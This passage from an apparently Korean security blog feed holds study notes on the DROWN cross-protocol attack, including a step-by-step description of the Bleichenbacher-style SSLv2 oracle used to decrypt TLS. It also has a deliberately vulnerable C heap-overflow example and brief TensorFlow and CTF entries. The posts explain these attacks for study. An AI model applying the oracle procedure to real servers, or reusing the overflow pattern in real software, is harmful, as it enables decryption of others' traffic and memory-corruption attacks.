<li>c->s, <code>Finished</code></li>
<li>s->c, <code>Finished</code></li>
</ul>


<p>Export 등급 <code>ClientMasterKey</code> 단계를 더 정리하면 (40-bit SSL_RC2_128_CBC_EXPORT40_WITH_MD5 가정).</p>

<ul>
<li>clear_key_data</li>
<li>secret_key_data (RSA PKCS#1 v1.5 로 암호화)</li>
<li>master_key = clear_key_data || secret_key_data</li>
<li>40-bit 경우, secret_key_data 는 5 bytes. (5*8 = 40)</li>
</ul>


<p>Non-export 등급은 master_key 전체가 암호화되어있고, clear_key_data 의 길이는 zero. 즉 Export 등급은 의도적으로 약화시킨 것이라고 보면 된다.</p>

<p>하여간, 이 정보들로 c,s 는 각각 session key 를 계산한다.</p>

<ul>
<li>server_write_key = MD5( mk || 0 || challenge || 커넥션 ID )</li>
<li>client_write_key = MD5( mk || 1 || challenge || 커넥션 ID )</li>
</ul>


<p>그리고, challenge 를 <code>server_write_key</code> 로 암호화해서 <code>ServerVerify</code> 메시지로 보낸다.</p>

<h4>The Drown attack</h4>

<p>Drown 공격은 SSLv2 핸드쉐이크의 다음 몇가지를 활용한다.</p>

<ul>
<li>secret_key_data 는 PKCS#1 v1.5 로 암호화한다는 사실</li>
<li>그리고, 클라이언트가 보내준 secret_key_data 를 자신의 private key (d) 로 복호화해서 master_key 를 만든다음에 그걸로 클라이언트가 보내준 <code>challenge</code> 를 암호화해서 다시 클라이언트에게 보내준다는 점. 이런 복호화 서비스를 서버는 항상 해준다는 점. 그것도 바로바로 즉시즉시.</li>
<li>secret_key_data 는 수출등급의 경우 단지 5 바이트에 불과하다는 사실</li>
</ul>


<p>이런 사실때문에 Drown 공격은 chosen-ciphertext attack.</p>

<h4>OpenSSL SSLv2 cipher suite selection bug</h4>

<p>Drown 공격이 OpenSSL 과 만나 심각해지는 포인트.</p>

<p>SSLv2 핸드쉐이크를 진행할때, <code>ClientMasterKey</code> 로 공통의 cipher suites 를 보내야하는데,
OpenSSL version &lt;= 1.1.0 의 경우, 서버가 지정하지않은 것도 client 맘대로 보내서 관철시킬 수 있는 버그가 있었다. 서버가 지원하지도 않는 수출등급 cipher 를 강제시킬 수 있는 것이다. CVE-2015-3197.</p>

<h4>Bleichenbacher&rsquo;s attack</h4>

<p>Bleichenbacher 의 공격은 padding oracle attack. RSA ciphertext 는 PKCS#1 v1.5 padding format 을 준수하는 plaintext 로 복호화되어야한다는 사실을 활용한다.</p>

<p>그럼 PKCS#1 v1.5 padding format 을 준수한다는 것의 의미는,</p>

<ul>
<li><code>00||02||PS||00||k</code> 형태</li>
<li>|PS| >= 8</li>
<li>m[3]~m[10] 에는 0x00 이 없어야 함 (적어도 8 바이트)</li>
</ul>


<p>그럼, Bleichenbacher 알고리즘은</p>

<ul>
<li>공격자는 valid 한 PKCS#1 v1.5 ciphertext 를 가지고 있음 (이걸 시작 포인트로 삼음)</li>
<li>공격자는 private key 는 접근 못함</li>
<li>그러나 oracle 을 가지고 있다고 가정한다.</li>
<li>oracle 은 1 or 0 을 리턴하는데,</li>
<li>m = c<sup>d</sup> mod N 의 값이 0x00 02 로 시작하면 1</li>
<li>아니면 0 을 돌려준다.</li>
</ul>


<p>이런 oracle 을 가지고 있다고 가정할 경우.</p>

<ul>
<li>oracle 이 1 을 돌려주면, plaintext m 이 어떤 특정 레인지 안쪽에 있다고 생각할 수 있다.</li>
<li>그 레인지는 0x00020000&hellip;. 보다는 크거나 같고, 0x0002FFFF&hellip;. 보다는 작거나 같고.</li>
<li>식으로 표시하면 2B &lt;= m &lt;= 3B -1, where B = 2<sup>8*(len-2)</sup></li>
</ul>


<p>그 다음 스텝은 RSA 연산의 변형성을 활용하는 것.</p>

<ul>
<li>d 는 몰라도 e 는 알고 있으니,</li>
<li><code>c_0 = m_0 ^ e mod N</code> 이라고 하면 양쪽에 s<sup>e</sup> 를 곱하면</li>
<li><code>c = (c_0 * s^e) mod N = (m_0 * s)^e mod N</code> 이 되니까, m_0 에 s 를 곱한 값을 encrypt 시킨 셈이 된다.</li>
<li><p>이 encrypted 된 값을 가지고 oracle 에 물어본다.</p></li>
<li><p>oracle 이 0 이라고 대답하면, s 를 증가시켜서 다시 물어본다.</p></li>
<li>이런 식으로 특정 규칙을 가지고 만들어진 가라 ciphertext 를 가지고 oracle 에 계속 확인을하다가 1 이 걸리면</li>
<li><code>c_0 * s^e</code> 가 decrypt 되었는데, 0x0002&hellip; 보다 크거나 같고, 0x0003&hellip; 보다 작은 정수로 decrypt 되었다는 것을 알게된다.</li>
<li>그 plaintext 는 m_0 * s 와 어떤 연관성을 가질 것이다.</li>
<li>그 연관성은 어떻게 될까?</li>
<li>modulo 연산이니까  m_0 * s 값과 N 의 배수만큼의 차이가 있을 것</li>
<li>즉 range 가 2B ~ 3B 사이가 아니라 2B + rN ~ 3B + rN 만큼 보정이 들어간다는 것.</li>
<li>s,r 을 try 해서 레인지를 좁혀나가면 m_0 를 구할 수 있다고 한다. (Bleichenbacher 에 따르면)</li>
</ul>


<h4>The SSLv2 oracle</h4>

<p>그렇다면, 이 연구자들이 OpenSSL SSLv2 code 에서 찾아낸 oracle 은 무었일까?</p>

<p>일단 general 한 oracle 이 있고 special 한 oracle 이 있다.</p>

<ul>
<li>일단 공격 target 은 TLS 1.0 ~ 1.2 그리고, TLS_RSA ciphersuites 를 사용한다고 가정.</li>
<li>그리고, 같은 RSA public key 가 TLS / SSLv2 양쪽에서 관찰되고 있다고 가정.</li>
<li>passive monitoring 만하고, active 공격은 안한다고 가정. 즉, MitM 상황이 아님.</li>
<li>서버에 최대한 가까운 네트웍에서 1,000 개 정도의 incoming 커넥션을 캡쳐할 수 있다고 가정.</li>
</ul>


<p>그리고, SSLv2 oracle 에 대한 가정은 다음과 같다.</p>

<ul>
<li>PKCS#1 v1.5 padding format 을 준수하는지 알려주는 oracle 이 노출하는 정보량은 다음과 같다.</li>
<li>처음이 00 || 02 로 시작하고</li>
<li>non-zero padding 이 있고</li>
<li>마지막이 00 || k 라는 것</li>
<li>SSL_RSA_EXPORT_WITH_RC2_CBC_40_MD5 의 경우 secret message k 는 5 bytes.</li>
<li>SSL_DES_192_EDE3_CBC_WITH_MD5 의 경우 k 는 24 bytes.</li>
<li>각각의 경우 +3 을 하면 8, 27 bytes 에 대한 정보(!!!)가 노출됨.</li>
</ul>


<p>이제 SSLv2 oracle 을 가지고 TLS 를 해독하는 것이 이 연구자들의 시나리오다.</p>

<p>그럴려면 TLS 핸드쉐이크도 알아야하는데, 이 공격에서 중요한 점은 두가지 차이점.</p>

<ol>
<li>일단 premaster secret 이란 걸 도입했고, 언제나 항상 48 bytes.</li>
<li>서버가 <code>ClientKeyExchange</code> 를 받으면 <code>ClientFinished</code> 를 기다린다는 것</li>
</ol>


<h4>DROWN attack template</h4>

<ul>
<li>TLS 에서 쓰이는 premaster secret 을 공격하려고 하는데.</li>
<li>premaster secret 는 decrypt 되면 48 byte 가 되는데.</li>
<li>SSLv2 의 경우, master key 가 PKCS#1 v1.5 포맷으로 decrypt 된는데.</li>
<li>premaster secret 를 SSLv2 에 태워서 신탁 문의(oracle query)를 해보려면 난점이 있다.</li>
<li>48 bytes 라는 길이 차이.</li>
<li>SSLv2 cipher suites 중에 48 bytes key 를 갖는 녀석이 있으면 좋았을텐데.</li>
</ul>


<p>Bleichenbacher 공격을 수행하려면, TLS ciphertext 를 SSLv2 key exchange 메시지로 변형시킬 방법이 필요하다. 우리가 가진 oracle 은 SSLv2 에서 쓰이는 symmetric key 를 RSA 로 암호/복호하는 프로세스에서 생기는 녀석이기때문에.</p>

<p>이 한계를 극복하기 위해 다음과 같은 작업을 수행했다고 한다. 흠. 놀랐다. 이런 짓을 하다니. 흠좀무.</p>

<ol>
<li>TLS RSA key exchange 메시지 다수를 캡쳐해야한다.</li>
<li>이제 캡쳐한 암호화된 premaster secret 를 RSA PKCS#1 v1.5 로 인코딩된 ciphertext 로 바꿔야한다.</li>
<li>이 작업을 Bardou et al. 이 발표한 방법으로 수행한다.</li>
<li>Bardou et al. 의 도움으로 SSLv2 RSA ciphertext 를 손에 쥐었다고 가정한다.</li>
<li>이제 Bleichenbacher 변종공격으로 해독에 성공한다.</li>
<li>이제 plaintext 를 premaster secret 로 다시 변환한다.</li>
</ol>


<p>인터넷에는 SSLv2 가 enable 되어있는 서버들이 널려있다.
그리고, SSLv2 가 취약하다는건 누구나 알고 있는 사실이다.
하지만, Modern 클라이언트는 SSLv2 를 사용하지 않는다.
그러니 인터넷은 안전한 것 아닌가?</p>

<p>아니다. 인터넷은 SSLv2 가 enable 되어있는 서버들이 많기도 하지만,
OpenSSL 버그때문에, 서버 설정에 상관없이, 강제로 SSLv2 로 네고할 수 있다.
생각보다 훨씬많은 SSLv2 oracle 이 인터넷에 널려있는 셈.</p>

<p>천재적인 발상은, TLS 와 SSLv2 가 private key 를 공유하고 있다는 사실에 생각이 미친 것!!!</p>

<p>즉 SSLv2 를 통해서 TLS 를 공격할 수 있는 것이다.</p>

<p>크로스 프로토콜 공격!!!</p>

<p>천재다!</p>

<p>제네럴한 버전과 스페셜한 공격, 두가지가 있다고 한다.</p>

<h4>General DROWN</h4>

<p>SSLv2 + 수출등급 cipher suites 가 먹는 서버를 oracle 로 만드는 방법.</p>

<p>SSLv2 에 oracle 이 생긴 이유는 다음과 같다고.</p>

<ol>
<li>ClientMasterKey 를 ServerVerify 로 바로 응답해주는데, ClientMasterKey 에는 enc_server 의 pk 로 암호화(secret portion of master key) 가 들어있고, ServerVerify 는 RSA decrypt 를 해서, 그 master key 로 암호화된 ciphertext 를 보내준다는 점.</li>
<li>40-bit 수출등급 RC2 or RC4 를 선택할경우, master key 의 11 bytes 는 clear text 로, 그리고 5 bytes 만이 암호화되서 보내진다는 점.</li>
<li>anti-Bleichenbacher 카운터메져가 구현된 서버의 경우, decrypt 했는데 invalid padding 이 나오면, 내색을 하지 않고 진행을 하는데.</li>
</ol>


<p>이를 이용해 valid 한 RSA ciphertext 를 oracle 에게 보냈는지를 추측한다.</p>

<ol>
<li>ClientMasterKey 에, 11 bytes clear key 랑 ciphertext c0 를 보낸다.</li>
<li>서버는 c0 를 RSA decrypt 해서 완벽한 master key 를 만들려고 할 것이다.</li>
<li>올바른 padding format 으로 decrypt 가 잘 될 것인가?</li>
<li>서버는 <code>server_write_key = MD5( mk || 0 || challenge || 커넥션 ID )</code> 로 만들어서, challenge 를 암호화해서 ServerVerify 로 돌려줄 것이다.</li>
<li>우리는 master key 의 5 bytes 를 모르는 것이다.</li>
<li>master key 에 모르는 5 bytes 만큼, 2<sup>40</sup> 만큼 노가다를 해서, server_write_key 를 exhaustive search 로 암호화된 challenge 를 복호화해본다.</li>
<li>어느 한 녀석은 복호화가 성공할 것이다.</li>
<li>이제 5 bytes 을 알게되었다.</li>
<li>이 5 bytes 가 PKCS#1 v1.5 EB 의 맨 뒤의 k 가 되는 셈.</li>
<li>두가지 가능성이, 하나는 ciphertext c0 가 PKCS#1 v1.5 EB 로 제대로 떨어졌을 경우와, 그렇지 않아서 anti-Bleichenbacher 카운터메져로 임의의 key 로 진행되었을 경우.</li>
</ol>


<p>이제 그 두 경우를 판별해내는 것이 필요하다.</p>

<p>이제, 다시 서버에 연결한다.</p>

<ol>
<li>ClientMasterKey 에 아까와 동일한 c0 를 실어 보낸다.</li>
<li>돌아온 ServerVerify 의 암호화된 challenge 를 <code>MD5( 아까 찾아낸 master key || 0 || 새로운 challenge || 새로운 커넥션 ID)</code> 로 decrypt 해본다.</li>
<li>만약 decrypt 가 되어서 challenge 값이 내가 보낸 값이랑 같으면 master key 가 두 세션에 걸쳐서 안정적으로 유지되고 있다는 이야기.</li>
<li>만약 challenge 값이 틀리면, 저번 세션과 이번 세션에 master key 가 다르다는 이야기.</li>
<li>즉 anti-Bleichenbacher 카운터메저가 동작해서 random 으로 master key 가 만들어져서, 프로토콜이 이상없는 듯 가짜로 진행되었다는 것.</li>
</ol>


<p>이 oracle 이 워킹하는 이유는, 수출등급으로 cipher 를 고정하고, 40 bit 에 대해서 노가다를 하는 것이 가능했기때문.</p>

<p>이 SSLv2 oracle 에 대해 정리하면,</p>

<ul>
<li>SSSLv2-export-oracle-function&copy; 를 돌리면, c 가 valid 한 PKCS#1 v1.5 EB 로 떨어지는 암호문인지 아닌지를 돌려준다.</li>
<li>그 코스트는 네트워크 커넥션 2번, 40 bit space 에 대한 노가다 (MD5 + symmetric cipher 수준)</li>
<li>valid 하다는 것은, plaintext 가 0x00 02 로 시작하며 중간에 0x00 딜리미터가 있고, 마지막 5 바이트는 찾아낸 master key 5 byte 랑 같다&hellip;라는 것.</li>
<li>이 논문 저자들은, 이런 멋진 정보를 알려주는 oracle 을 만들어낸 것이다.</li>
</ul>


<p>이제 이 oracle 함수를 가지고, cipher 텍스트에 RSA 변형 - 다양한 s<sup>e</sup> 를 곱하는 등의 - 을 가해서, TLS premaster secret 를 찾아내서 TLS 세션을 복호화하는 것이 그 임팩트.</p>

<p>그럼 이제 SSLv2 를 이용한 RSA oracle 은 만들었으니, TLS 에서 쓰이는 48 bytes premaster secret 을 SSLv2 oracle 이 받아들이는 형태로 변환하는 것이 필요하다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[MNIST for ML Beginners]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/25/mnist-for-ml-beginners/"/>
    <updated>2016-02-25T12:09:04+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/25/mnist-for-ml-beginners</id>
    <content type="html"><![CDATA[<p>TensorFlow 를 들여다보고 있다.</p>

<p><a href="https://www.tensorflow.org/versions/r0.7/tutorials/mnist/beginners/index.html#mnist-for-ml-beginners">첫번째 튜토리얼</a></p>

<p>TensorFlow docker image 설치</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ docker images
</span><span class='line'>REPOSITORY                                TAG                 IMAGE ID            CREATED             SIZE
</span><span class='line'>b.gcr.io/tensorflow/tensorflow            latest              002f882bde74        8 days ago          674.3 MB
</span><span class='line'>b.gcr.io/tensorflow-udacity/assignments   latest              59e4920e40f5        3 weeks ago         701.9 MB
</span><span class='line'>hello-world                               latest              690ed74de00f        4 months ago        960 B</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Plaid CTF 2015 - One NULL Byte]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/16/plaid-ctf-2015-one-null-byte/"/>
    <updated>2016-02-16T18:07:14+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/16/plaid-ctf-2015-one-null-byte</id>
    <content type="html"><![CDATA[<ul>
<li><a href="http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup">Write-up</a></li>
<li><a href="https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/tp">Binaries</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Understanding the Heap &amp; Exploiting Heap Overflows]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/"/>
    <updated>2016-02-12T16:13:07+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows</id>
    <content type="html"><![CDATA[<p>Mathy Vanhoef blog 의 <a href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html">Understanding the Heap &amp; Exploiting Heap Overflows</a> 를 정리한다.</p>

<p>먼저 취약한 예제.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>
</span><span class='line'>int main(int argc, char *argv[])
</span><span class='line'>{
</span><span class='line'>  char *buf1 = malloc(128);
</span><span class='line'>  char *buf2 = malloc(256);
</span><span class='line'>
</span><span class='line'>  printf("addr buf1: %p\n", buf1);
</span><span class='line'>  printf("addr buf2: %p\n", buf2);
</span><span class='line'>
</span><span class='line'>  read(fileno(stdin), buf1, 200);
</span><span class='line'>
</span><span class='line'>  free(buf2);
</span><span class='line'>  free(buf1);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h4>Basic Heap and Chunk Layout</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct malloc_chunk {
</span><span class='line'>  INTERNAL_SIZE_T     prev_size;
</span><span class='line'>  INTERNAL_SIZE_T     size;
</span><span class='line'>  
</span><span class='line'>  struct malloc_chunk* fd;
</span><span class='line'>  struct malloc_chunk* bk;
</span><span class='line'>
</span><span class='line'>  struct malloc_chunk* fd_nextsize;
</span><span class='line'>  struct malloc_chunk* bk_nextsize;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h4>Interpretation of the Chunk Structure</h4>

<ul>
<li>Allocated chunk 에서 사용되는 필드는 size 뿐이다.</li>
<li>그리고, <code>malloc()</code> 으로 돌아오는 포인터는 <code>fd</code> 랑 일치한다.</li>
<li><code>fd</code>, <code>bk</code> 를 이용해서 free 된 chunk 를 doubly linked list 로 관리한다.</li>
<li>size 의 하위 3 bit 는 사용되지 않는다. (align 되기때문에 항상 000 이 된다)</li>
<li>그래서, size 의 사용되지 않는 하위 비트들을 flag 로 사용한다.</li>
<li>size 의 LSB 는 previous chunk 가 alloc 인지 아닌지 flag 로 사용된다.</li>
<li>current chunk 가 사용되고 있는지 아닌지 아는 방법은, next chunk 의 size 필드의 LSB 를 보는 것이다. 즉 <code>cur_chunk + size + sizeof(INTERNAL_SIZE_T)</code> 로 next chunk 로 가서, <code>size &amp; 0x1</code> 로 체크하는 것이다.</li>
</ul>


<h4>Managing Free Chunks</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Unlocking the Motorola Bootloader by Azimuth Security]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security/"/>
    <updated>2016-02-12T10:12:12+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security</id>
    <content type="html"><![CDATA[<p>이번에는 좀 오래되었지만, Azimuth Security 블로그의 글을 정리해본다.</p>

<p><a href="http://blog.azimuthsecurity.com/2013/04/unlocking-motorola-bootloader.html?m=1">Unlocking the Motorola Bootloader</a></p>
]]></content>
  </entry>
  
</feed>
